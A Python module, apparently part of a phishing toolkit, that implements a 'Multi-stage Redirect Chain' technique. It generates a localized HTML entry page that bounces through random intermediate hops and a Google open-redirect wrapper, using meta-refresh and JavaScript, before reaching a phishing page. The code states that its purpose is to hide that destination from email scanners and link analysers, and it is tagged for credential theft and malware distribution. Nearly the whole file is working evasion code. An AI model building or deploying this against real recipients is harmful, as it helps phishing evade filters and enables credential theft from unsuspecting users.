from __future__ import annotations

import urllib.parse
from typing import Any, ClassVar

from app.techniques.base import (
    ApplyResult, BaseTechnique, Category, OptionSpec, Requirement, TechniqueGroup,
)
from app.utils.url_utils import random_string


class RedirectChainTechnique(BaseTechnique):
    """
    T6 — Multi-stage redirect chain + shortener + open redirect.

    Generates an HTML entry page that bounces through N intermediate
    redirects before landing on the actual phishing page. Each hop uses
    a different mechanism (meta refresh, JS, open-redirect wrapping).
    """

    TECHNIQUE_ID: ClassVar[int] = 6
    TECHNIQUE_NAME: ClassVar[str] = "Multi-stage Redirect Chain"
    GROUP: ClassVar[TechniqueGroup] = TechniqueGroup.URL_MANIPULATION
    CATEGORIES: ClassVar[list[Category]] = [Category.CREDENTIAL_THEFT, Category.MALWARE_DISTRIBUTION]
    REQUIREMENTS: ClassVar[list[Requirement]] = [Requirement.HAS_URL]
    DESCRIPTION: ClassVar[str] = (
        "Wraps the target URL in an HTML redirect chain (JS + meta-refresh). "
        "Each hop is on a different 'domain' path, hiding the final destination "
        "from email scanners and link analysers."
    )
    OPTION_SPECS: ClassVar[list[OptionSpec]] = [
        OptionSpec(
            name="hop_count",
            description="Number of intermediate redirect hops (1–10)",
            type=int,
            default=3,
            min_value=1,
            max_value=10,
        ),
        OptionSpec(
            name="open_redirect_template",
            description=(
                "Open-redirect URL template; use {url} placeholder. "
                "Empty = skip open-redirect wrapping."
            ),
            type=str,
            default="https://www.google.com/url?q={url}",
        ),
        OptionSpec(
            name="delay_ms",
            description="Delay in milliseconds before each JS redirect",
            type=int,
            default=500,
            min_value=0,
            max_value=5000,
        ),
    ]

    _ALLOWED_SCHEMES = {"http", "https"}

    def apply(
        self,
        html: str,
        url: str,
        options: dict[str, Any],
        screenshot_bytes: bytes | None = None,
    ) -> ApplyResult:
        hop_count: int = int(options.get("hop_count", 3))
        template: str = options.get(
            "open_redirect_template", "https://www.google.com/url?q={url}"
        )
        delay_ms: int = int(options.get("delay_ms", 500))

        scheme = urllib.parse.urlparse(url).scheme.lower()
        if scheme and scheme not in self._ALLOWED_SCHEMES:
            self.log("warning", "redirect_skip", reason="bad_scheme", scheme=scheme)
            return ApplyResult(
                modified_html=None, modified_url=None, extra_files={},
                change_log=[self._make_change(
                    "url_redirect_skipped",
                    f"Skipped: target scheme '{scheme}' not in {sorted(self._ALLOWED_SCHEMES)}",
                    before=url, after=url,
                    details={"reason": "bad_scheme", "scheme": scheme},
                )],
            )

        final_url = url
        if template and "{url}" in template:
            final_url = template.format(url=urllib.parse.quote(url, safe=""))

        chain_urls = [final_url]
        for i in range(hop_count - 1):
            token = random_string(12)
            intermediate = (
                f"https://cdn-redirect-{i}.example-cdn.net/r?"
                f"token={token}&next={urllib.parse.quote(chain_urls[-1], safe='')}"
            )
            chain_urls.append(intermediate)

        chain_urls.reverse()

        lang = self._detect_lang(html, url)
        entry_target = chain_urls[0]
        entry_html = self._build_redirect_page(entry_target, delay_ms, lang=lang)

        chain_text = "\n".join(
            [f"Entry page → {chain_urls[0]}"]
            + [f"Hop {i+1} → {u}" for i, u in enumerate(chain_urls[1:])]
            + [f"Final destination → {url}"]
        )

        html_validates = True
        try:
            from bs4 import BeautifulSoup
            BeautifulSoup(entry_html, "lxml")
        except Exception as e:
            html_validates = False
            self.log("warning", "redirect_html_parse_failed", error=str(e))

        self.log("info", "redirect_applied",
                 hops=hop_count, open_redirect=bool(template),
                 final_url_len=len(final_url))

        return ApplyResult(
            modified_html=entry_html,
            modified_url=chain_urls[0],
            extra_files={
                "redirect_chain.html": entry_html.encode(),
                "redirect_chain.txt": chain_text.encode(),
            },
            change_log=[
                self._make_change(
                    "url_redirect_chain",
                    f"Built {hop_count}-hop redirect chain; "
                    f"open-redirect wrapping={'yes' if template else 'no'}",
                    before=url,
                    after=chain_urls[0],
                    details={
                        "hops": hop_count,
                        "chain": chain_urls,
                        "open_redirect": bool(template),
                        "delay_ms": delay_ms,
                        "html_validates": html_validates,
                    },
                )
            ],
        )

    def evaluate(self, html, url, change_log, extra_files):
        from app.techniques.base import EvaluationResult
        signals, issues = [], []

        if html and 'http-equiv="refresh"' in html.lower():
            signals.append("HTML has <meta http-equiv='refresh'> redirect")
        else:
            issues.append("HTML missing <meta http-equiv='refresh'> redirect")

        if html and "window.location.href" in html:
            signals.append("HTML has JS window.location.href redirect")
        else:
            issues.append("HTML missing JS window.location.href redirect")

        chain_txt = extra_files.get("redirect_chain.txt", b"").decode("utf-8", errors="replace")
        hops = [l for l in chain_txt.splitlines() if l.strip().startswith("Hop")]
        if len(hops) >= 1:
            signals.append(f"Redirect chain has {len(hops)} intermediate hop(s)")
        else:
            issues.append("redirect_chain.txt has no intermediate hops")

        entry = next((e for e in change_log if e.change_type == "url_redirect_chain"), None)
        if entry:
            hop_count = entry.details.get("hops", 0)
            if hop_count >= 2:
                signals.append(f"change_log: {hop_count} hops configured")
            else:
                issues.append(f"change_log shows only {hop_count} hop(s)")
        else:
            issues.append("No url_redirect_chain entry in change_log")

        passed = ("window.location.href" in (html or "")) and len(hops) >= 1
        return EvaluationResult(
            passed=passed,
            score=self._eval_score(signals, issues),
            signals=signals,
            issues=issues,
            details={"hop_count": len(hops), "has_js_redirect": "window.location.href" in (html or "")},
        )

    def _build_redirect_page(self, target: str, delay_ms: int, lang: str = "fa") -> str:
        from app.utils.i18n import t
        safe_target = target.replace("'", "\\'").replace('"', "&quot;")
        meta_delay_sec = max(1, delay_ms // 1000)
        dir_attr = "rtl" if lang == "fa" else "ltr"
        title = t("redirect.title", lang)
        body_text = t("redirect.body", lang)
        return f"""<!DOCTYPE html>
<html lang="{lang}" dir="{dir_attr}">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="refresh" content="{meta_delay_sec};url={safe_target}">
  <title>{title}</title>
  <style>
    body{{margin:0;display:flex;align-items:center;justify-content:center;
         height:100vh;font-family:Tahoma,Arial,sans-serif;background:#f9f9f9;}}
    .msg{{text-align:center;color:#555;}}
    .spinner{{width:40px;height:40px;border:4px solid #e0e0e0;
              border-top:4px solid #4285f4;border-radius:50%;
              animation:spin 0.8s linear infinite;margin:0 auto 12px;}}
    @keyframes spin{{to{{transform:rotate(360deg);}}}}
  </style>
</head>
<body>
  <div class="msg">
    <div class="spinner"></div>
    <p>{body_text}</p>
  </div>
  <script>
    setTimeout(function(){{
      window.location.href = '{safe_target}';
    }}, {delay_ms});
  </script>
</body>
</html>"""
